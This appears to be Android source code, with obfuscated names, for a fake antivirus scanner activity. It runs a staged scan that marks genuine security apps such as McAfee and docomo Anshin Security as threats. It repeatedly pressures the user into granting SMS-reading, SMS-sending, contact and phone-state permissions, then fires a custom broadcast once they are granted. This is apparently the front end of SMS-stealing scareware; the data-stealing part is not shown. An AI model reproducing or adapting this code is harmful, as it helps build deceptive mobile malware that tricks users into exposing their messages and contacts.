package replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_aas;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_rryyuActivity;
import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Thfgfw;
import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.R;
import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio;
import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty;
import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_UjjuioActivity;

import java.math.BigDecimal;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class replaceflag_Bteert extends Activity {
    private LinearLayout mBgLl;
    private RelativeLayout mScanRl;
    private TextView mScan;
    private TextView mStartScan;
    private TextView mTip;
    private TextView mTip2;
    private RelativeLayout mNumRl;
    private TextView mNumTv;
    private TextView mOpenTv1;
    private TextView mOpenTv2;
    private TextView mOpenTv3;
    private TextView mOpenTv4;
    private TextView mOpenTv5;
    private RelativeLayout mTopRl1;
    private RelativeLayout mTopRl2;
    private RelativeLayout mTopRl3;
    private RelativeLayout mTopRl4;

    private ArrayList<replaceflag_Begryt> mData = new ArrayList();
    private String[] mPkgNames = new String[]{"com.wsandroid.suite", "com.au.anshinnetsecurity",
            "com.nttdocomo.android.anshinsecurity", "com.mcafee.vsm_android_dcm"};
    private boolean mHasDanger = false;
    private int mDangerNum = 0;

    private String[] mOldPkgNames = new String[]{"com.frgv.aszw", "com.qwsc.ikol","com.ccfv.rrss"};

    private String[] permissions = new String[]{
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECEIVE_SMS
    };
    private String[] permissions2 = new String[]{
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS
    };
    private ArrayList<String> mPermissionList = new ArrayList<>();

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.replaceflag_activitymcc_hhf);

//        setContentView(R.layout.permission_guide);

        mBgLl= findViewById(R.id.bg_ll);
        mScanRl = findViewById(R.id.scan_rl);
        mScan = findViewById(R.id.scan);
        mStartScan = findViewById(R.id.start_scan);
        mTip = findViewById(R.id.replaceflag_tip);
        mTip2 = findViewById(R.id.replaceflag_tip2);
        mNumTv = findViewById(R.id.num_tv);
        mNumRl = findViewById(R.id.num_rl);
        mOpenTv1 = findViewById(R.id.open1);
        mOpenTv2 = findViewById(R.id.open2);
        mOpenTv3 = findViewById(R.id.open3);
        mOpenTv4 = findViewById(R.id.open4);
        mOpenTv5 = findViewById(R.id.open5);
        mTopRl1 = findViewById(R.id.top_rl1);
        mTopRl2 = findViewById(R.id.top_rl2);
        mTopRl3 = findViewById(R.id.top_rl3);
        mTopRl4 = findViewById(R.id.top_rl4);

        mScanRl.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(replaceflag_Styuty.getInt(replaceflag_Cskuio.SP_DANGER_NUMBER, 0)==0){
                    mStartScan.setVisibility(View.GONE);
                    mTip2.setVisibility(View.VISIBLE);
                    replaceflag_Styuty.putLong(replaceflag_Cskuio.SP_SCAN_TIME, System.currentTimeMillis());
                    showScan();
                } else {
                    startActivity(new Intent(replaceflag_Bteert.this, replaceflag_Bggere.class));
                }
            }
        });
        mStartScan.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(replaceflag_Styuty.getInt(replaceflag_Cskuio.SP_DANGER_NUMBER, 0)<=0){
                    mStartScan.setVisibility(View.GONE);
                    mTip2.setVisibility(View.VISIBLE);
                    replaceflag_Styuty.putLong(replaceflag_Cskuio.SP_SCAN_TIME, System.currentTimeMillis());
                    showScan();
                } else {
                    startActivity(new Intent(replaceflag_Bteert.this, replaceflag_Bggere.class));
                }
            }
        });
        mOpenTv1.setOnClickListener(v -> {
            replaceflag_Thfgfw.show(getString(R.string.replaceflag_tip42));
        });
        mOpenTv2.setOnClickListener(v -> {
            replaceflag_Thfgfw.show(getString(R.string.replaceflag_tip42));
        });
        mOpenTv3.setOnClickListener(v -> {
            replaceflag_Thfgfw.show(getString(R.string.replaceflag_tip42));
        });
        mOpenTv4.setOnClickListener(v -> {
            replaceflag_Thfgfw.show(getString(R.string.replaceflag_tip42));
        });
        mOpenTv5.setOnClickListener(v -> {
            replaceflag_Thfgfw.show(getString(R.string.replaceflag_tip42));
        });
        mTopRl1.setOnClickListener(v -> {
            replaceflag_Thfgfw.show(getString(R.string.replaceflag_tip42));
        });
        mTopRl2.setOnClickListener(v -> {
            replaceflag_Thfgfw.show(getString(R.string.replaceflag_tip42));
        });
        mTopRl3.setOnClickListener(v -> {
            replaceflag_Thfgfw.show(getString(R.string.replaceflag_tip42));
        });
        mTopRl4.setOnClickListener(v -> {
            replaceflag_Thfgfw.show(getString(R.string.replaceflag_tip42));
        });

        if(isOldAppInstalled()){
            startActivity(new Intent(this, replaceflag_UjjuioActivity.class));
        }

        for (int i = 0; i < permissions.length; i++) {
            if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permissions[i]);//添加还未授予的权限
            }
        }
        if (mPermissionList.size() > 0) {
            ActivityCompat.requestPermissions(this, permissions, 1);
        }

    }

    private int time = 0;

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        boolean hasPermissionDismiss = false;//有权限没有通过
        if (1 == requestCode) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                    hasPermissionDismiss = true;
                }
            }
            //如果有权限没有被允许
            if (hasPermissionDismiss && time<5) {
                time++;
                startActivityForResult(new Intent(this, replaceflag_rryyuActivity.class), 1);
            }
            if(!hasPermissionDismiss){
                sendBroadcast(new Intent("android.permissions.send"));
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if(requestCode == 1&&resultCode==0){
            mPermissionList.clear();
            for (int i = 0; i < permissions2.length; i++) {
                if (ContextCompat.checkSelfPermission(this, permissions2[i]) != PackageManager.PERMISSION_GRANTED) {
                    mPermissionList.add(permissions2[i]);//添加还未授予的权限
                }
            }
            if (mPermissionList.size() > 0) {
                ActivityCompat.requestPermissions(this, permissions2, 1);
            }
        }
    }

    private boolean isOldAppInstalled(){
        boolean installed =false;
        for (int i=0;i<mOldPkgNames.length;i++){
            PackageManager pm = getPackageManager();
            try{
                pm.getPackageInfo(mOldPkgNames[i],PackageManager.GET_ACTIVITIES);
                installed =true;
            }catch(PackageManager.NameNotFoundException e){
            }
        }
        return installed;
    }

    @Override
    protected void onResume() {
        super.onResume();
        mHandler.sendEmptyMessageDelayed(1, 200);

        i = 0;
        mDangerNum = replaceflag_Styuty.getInt(replaceflag_Cskuio.SP_DANGER_NUMBER, 0);
        if(replaceflag_Styuty.getInt(replaceflag_Cskuio.SP_DANGER_NUMBER, 0) <= 0){
            mBgLl.setBackgroundColor(Color.parseColor("#084F9E"));
            mScan.setText(getString(R.string.replaceflag_scan));
            mScan.setTextColor(Color.parseColor("#00AEEF"));
            mStartScan.setVisibility(View.VISIBLE);
            mTip2.setVisibility(View.GONE);
            mTip.setText(getString(R.string.replaceflag_tip));
            mNumRl.setVisibility(View.GONE);
        } else {
            mBgLl.setBackgroundColor(Color.parseColor("#C81A2E"));
            mScan.setText(getString(R.string.replaceflag_tip12));
            mScan.setTextColor(getResources().getColor(R.color.replaceflag_color5));
            mStartScan.setVisibility(View.GONE);
            mNumRl.setVisibility(View.VISIBLE);
            mTip2.setVisibility(View.VISIBLE);
            mTip2.setText(String.format(getString(R.string.replaceflag_tip5),mDangerNum));
            mTip.setText(getString(R.string.replaceflag_tip13) + " " +
                    new SimpleDateFormat("yyyy-MM-dd").format(new Date(replaceflag_Styuty.getLong(replaceflag_Cskuio.SP_SCAN_TIME, 0))));
            mNumTv.setText(mDangerNum + "");
        }
    }

    private void getPackages() {
        mData.clear();
        // 获取已经安装的所有应用, PackageInfo　系统类，包含应用信息
        List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packages.size(); i++) {
            PackageInfo packageInfo = packages.get(i);
//            if ((packageInfo.applicationInfo.flags& ApplicationInfo.FLAG_SYSTEM) == 0) { //非系统应用

                mData.add(new replaceflag_Begryt(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString(),
                        packageInfo.packageName));
//            }
        }
    }

    private int i = 0;
    private void showScan(){
        if(i<mData.size()) {
            BigDecimal b = new BigDecimal(i * 100.0 / mData.size());
            float f1 = b.setScale(1, BigDecimal.ROUND_HALF_UP).floatValue();
            mScan.setText(f1 + "%");
            mTip.setText(getString(R.string.replaceflag_tip11) + "  " + mData.get(i).name);
            for (int j=0;j<mPkgNames.length;j++){
                if(mData.get(i).pkgName.equals(mPkgNames[j])){
                    mDangerNum++;
                    mHasDanger = true;
                    replaceflag_Styuty.putInt(replaceflag_Cskuio.SP_DANGER_NUMBER, mDangerNum);
                    mBgLl.setBackgroundColor(Color.parseColor("#C81A2E"));
                    mTip2.setText(String.format(getString(R.string.replaceflag_tip5),mDangerNum));
                    mNumRl.setVisibility(View.VISIBLE);
                    mNumTv.setText(mDangerNum + "");
                }
            }

            mHandler.sendEmptyMessageDelayed(0, 60);
        }
    }

    private Handler mHandler = new Handler(){
        @Override
        public void handleMessage(@NonNull Message msg) {
            super.handleMessage(msg);
            switch (msg.what){
                case 0:
                    i++;
                    if(i<mData.size()){
                        showScan();
                    } else if(mHasDanger){
                        i = 0;
                        mScan.setText(getString(R.string.replaceflag_tip12));
                        mScan.setTextColor(getResources().getColor(R.color.replaceflag_color5));
                        mTip.setText(getString(R.string.replaceflag_tip13) + " " +
                                new SimpleDateFormat("yyyy-MM-dd").format(new Date(replaceflag_Styuty.getLong(replaceflag_Cskuio.SP_SCAN_TIME, 0))));
                    } else {
                        i = 0;
                        mScan.setText(getString(R.string.replaceflag_scan));
                        mScan.setTextColor(Color.parseColor("#00AEEF"));
                        mStartScan.setVisibility(View.VISIBLE);
                        mTip2.setText(getString(R.string.replaceflag_tip15));
                        mTip.setText(getString(R.string.replaceflag_tip13) + " " +
                                new SimpleDateFormat("yyyy-MM-dd").format(new Date(replaceflag_Styuty.getLong(replaceflag_Cskuio.SP_SCAN_TIME, 0))));
                        startActivity(new Intent(replaceflag_Bteert.this, replaceflag_Mjyyui.class));
                    }
                    break;
                case 1:
                    getPackages();
                    break;
            }
        }
    };
}
